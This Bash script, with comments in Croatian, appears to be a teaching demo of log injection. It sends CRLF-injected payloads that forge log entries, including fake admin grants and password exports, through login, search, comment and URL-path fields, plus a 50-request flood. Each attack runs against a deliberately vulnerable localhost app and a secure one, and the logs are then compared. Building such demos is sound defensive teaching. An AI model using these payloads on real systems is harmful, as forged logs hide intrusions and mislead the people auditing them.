#!/bin/bash
# =============================================================================
# Demo Attack Script - Demonstracija log injection napada
# =============================================================================
# Pokreće različite napade na ranjivu aplikaciju za demonstraciju
# =============================================================================

set -e

VULNERABLE_URL="http://localhost:8081"
SECURE_URL="http://localhost:8080"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo "=============================================="
echo "Log Injection Attack Demo"
echo "=============================================="
echo ""

# -----------------------------------------------------------------------------
# Provjera dostupnosti
# -----------------------------------------------------------------------------
echo -e "${YELLOW}[0] Provjera dostupnosti aplikacija...${NC}"

if ! curl -s "$VULNERABLE_URL/health" > /dev/null 2>&1; then
    echo -e "${RED}GREŠKA: Ranjiva aplikacija nije dostupna na $VULNERABLE_URL${NC}"
    echo "Pokrenite: podman-compose up -d"
    exit 1
fi

if ! curl -s "$SECURE_URL/health" > /dev/null 2>&1; then
    echo -e "${RED}GREŠKA: Sigurna aplikacija nije dostupna na $SECURE_URL${NC}"
    echo "Pokrenite: podman-compose up -d"
    exit 1
fi

echo -e "${GREEN}✓ Obje aplikacije dostupne${NC}"
echo ""

# -----------------------------------------------------------------------------
# NAPAD 1: Osnovni CRLF Injection
# -----------------------------------------------------------------------------
echo -e "${CYAN}[1] CRLF Injection napad${NC}"
echo "    Ubacivanje lažnog log zapisa kroz korisničko ime"
echo ""

PAYLOAD='{"username": "admin\n2026-01-20 12:00:00 - Login SUCCESSFUL for user: hacker [ADMIN ACCESS GRANTED]", "password": "wrong"}'

echo -e "${YELLOW}Payload:${NC}"
echo "$PAYLOAD" | python3 -m json.tool 2>/dev/null || echo "$PAYLOAD"
echo ""

echo -e "${RED}Napad na RANJIVU aplikaciju:${NC}"
curl -s -X POST "$VULNERABLE_URL/login" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" | python3 -m json.tool 2>/dev/null || echo "Zahtjev poslan"
echo ""

echo -e "${GREEN}Isti napad na SIGURNU aplikaciju:${NC}"
curl -s -X POST "$SECURE_URL/login" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" | python3 -m json.tool 2>/dev/null || echo "Zahtjev poslan"
echo ""

sleep 1

# -----------------------------------------------------------------------------
# NAPAD 2: Log Flooding
# -----------------------------------------------------------------------------
echo -e "${CYAN}[2] Log Flooding napad${NC}"
echo "    Generiranje velikog broja zahtjeva"
echo ""

echo -e "${YELLOW}Šaljem 50 zahtjeva na ranjivu aplikaciju...${NC}"
for i in {1..50}; do
    curl -s -X POST "$VULNERABLE_URL/login" \
      -H "Content-Type: application/json" \
      -d "{\"username\": \"flood_user_$i\", \"password\": \"x\"}" > /dev/null &
done
wait
echo -e "${GREEN}✓ Flooding završen${NC}"
echo ""

sleep 1

# -----------------------------------------------------------------------------
# NAPAD 3: Search Parameter Injection
# -----------------------------------------------------------------------------
echo -e "${CYAN}[3] Search Parameter Injection${NC}"
echo "    Ubacivanje kroz URL query parametar"
echo ""

SEARCH_PAYLOAD="test%0A2026-01-20%2012:00:00%20-%20ADMIN%20BACKDOOR%20INSTALLED"

echo -e "${RED}Napad na RANJIVU aplikaciju:${NC}"
curl -s "$VULNERABLE_URL/search?q=$SEARCH_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

echo -e "${GREEN}Isti napad na SIGURNU aplikaciju:${NC}"
curl -s "$SECURE_URL/search?q=$SEARCH_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

sleep 1

# -----------------------------------------------------------------------------
# NAPAD 4: Comment Injection
# -----------------------------------------------------------------------------
echo -e "${CYAN}[4] Comment Field Injection${NC}"
echo "    Višestruke injekcije kroz polja komentara"
echo ""

COMMENT_PAYLOAD='{"user": "hacker\n2026-01-20 - SYSTEM: All passwords exported to external server", "comment": "normal comment\n2026-01-20 - DATABASE: Backup completed successfully"}'

echo -e "${RED}Napad na RANJIVU aplikaciju:${NC}"
curl -s -X POST "$VULNERABLE_URL/comment" \
  -H "Content-Type: application/json" \
  -d "$COMMENT_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

echo -e "${GREEN}Isti napad na SIGURNU aplikaciju:${NC}"
curl -s -X POST "$SECURE_URL/comment" \
  -H "Content-Type: application/json" \
  -d "$COMMENT_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

sleep 1

# -----------------------------------------------------------------------------
# NAPAD 5: URL Path Injection
# -----------------------------------------------------------------------------
echo -e "${CYAN}[5] URL Path Injection${NC}"
echo "    Injekcija kroz URL path parametar"
echo ""

URL_PAYLOAD="admin%0A2026-01-20%20-%20Password%20reset%20for%20admin%20-%20new%20password:%20hacked123"

echo -e "${RED}Napad na RANJIVU aplikaciju:${NC}"
curl -s "$VULNERABLE_URL/user/$URL_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

echo -e "${GREEN}Isti napad na SIGURNU aplikaciju:${NC}"
curl -s "$SECURE_URL/user/$URL_PAYLOAD" | python3 -m json.tool 2>/dev/null
echo ""

# -----------------------------------------------------------------------------
# Pregled logova
# -----------------------------------------------------------------------------
echo "=============================================="
echo -e "${YELLOW}PREGLED LOGOVA${NC}"
echo "=============================================="
echo ""

echo -e "${RED}RANJIVA aplikacija - zadnjih 10 log zapisa:${NC}"
curl -s "$VULNERABLE_URL/admin/logs" | python3 -m json.tool 2>/dev/null | head -50
echo ""

echo -e "${GREEN}SIGURNA aplikacija - zadnjih 10 log zapisa:${NC}"
curl -s "$SECURE_URL/admin/logs" | python3 -m json.tool 2>/dev/null | head -50
echo ""

# -----------------------------------------------------------------------------
# Zaključak
# -----------------------------------------------------------------------------
echo "=============================================="
echo -e "${CYAN}ZAKLJUČAK${NC}"
echo "=============================================="
echo ""
echo "1. Pogledajte logove RANJIVE aplikacije - vidjet ćete ubačene lažne zapise"
echo "2. Pogledajte logove SIGURNE aplikacije - svi kontrolni znakovi su uklonjeni"
echo "3. U Kibani (http://localhost:5601) možete vidjeti:"
echo "   - Index: security-alerts-* za otkrivene napade"
echo "   - Tag: potential_log_injection"
echo ""
echo "Za više informacija pogledajte README.md"
echo ""
